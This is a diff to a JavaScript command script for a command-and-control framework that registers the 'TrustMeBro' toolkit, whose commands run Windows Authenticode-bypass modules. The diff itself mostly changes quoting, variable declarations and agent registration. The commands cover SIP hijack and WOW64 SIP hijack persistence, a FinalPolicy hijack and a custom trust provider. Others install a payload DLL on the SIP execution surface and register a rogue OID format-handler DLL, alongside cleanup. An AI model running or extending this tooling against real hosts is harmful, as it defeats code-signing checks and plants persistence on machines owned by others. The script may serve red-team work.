@@ -7,31 +7,30 @@
 
 var metadata = {
     name: "TrustMeBro",
-    description: "Authenticode signature manipulation BOFs (SIP hijack, FinalPolicy, SigStash, probe)",
-    store: true
+    description: "Authenticode signature manipulation BOFs (SIP hijack, FinalPolicy, SigStash, probe)"
 };
 
 var bof_dir = ax.script_dir() + "../bin/";
 
 // ---- tmb_probe ----
-let cmd_probe = ax.create_command("tmb_probe", "Query local CI enforcement state", "tmb_probe");
+var cmd_probe = ax.create_command("tmb_probe", "Query local CI enforcement state", "tmb_probe");
 cmd_probe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let bof_path = bof_dir + "tmb_probe." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path, "Task: CI probe");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: CI probe");
 });
 
 // ---- tmb_finalpolicy ----
-let cmd_fp = ax.create_command("tmb_finalpolicy", "FinalPolicy hijack (SoftpubCleanup)", "tmb_finalpolicy [--clean]");
+var cmd_fp = ax.create_command("tmb_finalpolicy", "FinalPolicy hijack (SoftpubCleanup)", "tmb_finalpolicy [--clean]");
 cmd_fp.addArgBool("--clean", "Restore FinalPolicy to default");
 cmd_fp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let action = parsed_json["--clean"] ? 1 : 0;
     let bof_params = ax.bof_pack("short", [action]);
     let bof_path = bof_dir + "tmb_finalpolicy." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: FinalPolicy");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: FinalPolicy");
 });
 
 // ---- tmb_sip_hijack ----
-let cmd_sip = ax.create_command("tmb_sip_hijack", "SIP persistence (VerifyIndirectData redirect)", "tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]");
+var cmd_sip = ax.create_command("tmb_sip_hijack", "SIP persistence (VerifyIndirectData redirect)", "tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]");
 cmd_sip.addArgBool("--clean", "Restore SIP keys to defaults");
 cmd_sip.addArgBool("--all-sips", "Target all 17 standard SIPs");
 cmd_sip.addArgBool("--sac", "Include Smart App Control SIP");
@@ -44,11 +43,11 @@ cmd_sip.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let guids = parsed_json["sip_types"] || "pe,ps1,msi";
     let bof_params = ax.bof_pack("short,short,cstr", [action, flags, guids]);
     let bof_path = bof_dir + "tmb_sip_hijack." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: SIP hijack");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SIP hijack");
 });
 
 // ---- tmb_wow64_hijack ----
-let cmd_wow = ax.create_command("tmb_wow64_hijack", "SIP hijack WOW6432Node only (32-bit callers)", "tmb_wow64_hijack [--sip-types pe,ps1] [--clean]");
+var cmd_wow = ax.create_command("tmb_wow64_hijack", "SIP hijack WOW6432Node only (32-bit callers)", "tmb_wow64_hijack [--sip-types pe,ps1] [--clean]");
 cmd_wow.addArgBool("--clean", "Restore WOW64 SIP keys");
 cmd_wow.addArgBool("--all-sips", "All SIPs");
 cmd_wow.addArgBool("--sac", "Smart App Control");
@@ -61,11 +60,11 @@ cmd_wow.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let guids = parsed_json["sip_types"] || "pe,ps1,msi";
     let bof_params = ax.bof_pack("short,short,cstr", [action, flags, guids]);
     let bof_path = bof_dir + "tmb_wow64_hijack." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: WOW64 SIP hijack");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: WOW64 SIP hijack");
 });
 
 // ---- tmb_custom_provider ----
-let cmd_cp = ax.create_command("tmb_custom_provider", "Custom trust provider GUID with SoftpubCleanup", "tmb_custom_provider {GUID} [--clean]");
+var cmd_cp = ax.create_command("tmb_custom_provider", "Custom trust provider GUID with SoftpubCleanup", "tmb_custom_provider {GUID} [--clean]");
 cmd_cp.addArgString("guid", true);
 cmd_cp.addArgBool("--clean", "Remove the custom provider");
 cmd_cp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -73,11 +72,11 @@ cmd_cp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let guid = parsed_json["guid"] || "";
     let bof_params = ax.bof_pack("short,cstr", [action, guid]);
     let bof_path = bof_dir + "tmb_custom_provider." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: Custom provider");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Custom provider");
 });
 
 // ---- tmb_sip_exec ----
-let cmd_se = ax.create_command("tmb_sip_exec", "Install payload DLL on SIP execution surface", "tmb_sip_exec install --dll C:\\path --guid pe");
+var cmd_se = ax.create_command("tmb_sip_exec", "Install payload DLL on SIP execution surface", "tmb_sip_exec --dll C:\\path --guid pe [--clean]");
 cmd_se.addArgFlagString("--dll", "dll", "Path to payload DLL", "");
 cmd_se.addArgFlagString("--guid", "guid", "GUID alias", "pe");
 cmd_se.addArgBool("--clean", "Remove (same as remove)");
@@ -87,11 +86,11 @@ cmd_se.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let guid = parsed_json["guid"] || "pe";
     let bof_params = ax.bof_pack("short,cstr,cstr", [action, dll, guid]);
     let bof_path = bof_dir + "tmb_sip_exec." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: SIP exec");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SIP exec");
 });
 
 // ---- tmb_clean ----
-let cmd_clean = ax.create_command("tmb_clean", "Remove all TrustMeBro persistence", "tmb_clean --all");
+var cmd_clean = ax.create_command("tmb_clean", "Remove all TrustMeBro persistence", "tmb_clean --all");
 cmd_clean.addArgBool("--sip", "Restore SIP keys");
 cmd_clean.addArgBool("--finalpolicy", "Restore FinalPolicy");
 cmd_clean.addArgBool("--all", "Full cleanup");
@@ -104,11 +103,11 @@ cmd_clean.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let guid = parsed_json["provider"] || "";
     let bof_params = ax.bof_pack("short,cstr", [flags, guid]);
     let bof_path = bof_dir + "tmb_clean." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: Cleanup");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Cleanup");
 });
 
 // ---- tmb_formatghost ----
-let cmd_fg = ax.create_command("tmb_formatghost", "CryptDllFormatObject OID handler (analyst-triggered)", "tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\\path");
+var cmd_fg = ax.create_command("tmb_formatghost", "CryptDllFormatObject OID handler (analyst-triggered)", "tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\\path");
 cmd_fg.addArgFlagString("--oid", "oid", "OID to register", "");
 cmd_fg.addArgFlagString("--dll", "dll", "Path to handler DLL", "");
 cmd_fg.addArgFlagString("--funcname", "func", "Export name", "FormatObject");
@@ -120,11 +119,9 @@ cmd_fg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let func = parsed_json["func"] || "FormatObject";
     let bof_params = ax.bof_pack("short,cstr,cstr,cstr", [action, oid, dll, func]);
     let bof_path = bof_dir + "tmb_formatghost." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: FormatGhost");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: FormatGhost");
 });
 
-// ---- Register command group ----
-var tmb_group = ax.create_commands_group("TrustMeBro", [
-    cmd_probe, cmd_fp, cmd_sip, cmd_wow, cmd_cp, cmd_se, cmd_clean, cmd_fg
-]);
-ax.register_commands_group(tmb_group, ["beacon"], ["windows"], []);
+// ---- Register ----
+var tmb_group = ax.create_commands_group("TrustMeBro", [cmd_probe, cmd_fp, cmd_sip, cmd_wow, cmd_cp, cmd_se, cmd_clean, cmd_fg]);
+ax.register_commands_group(tmb_group, ["beacon", "gopher"], ["windows"], []);
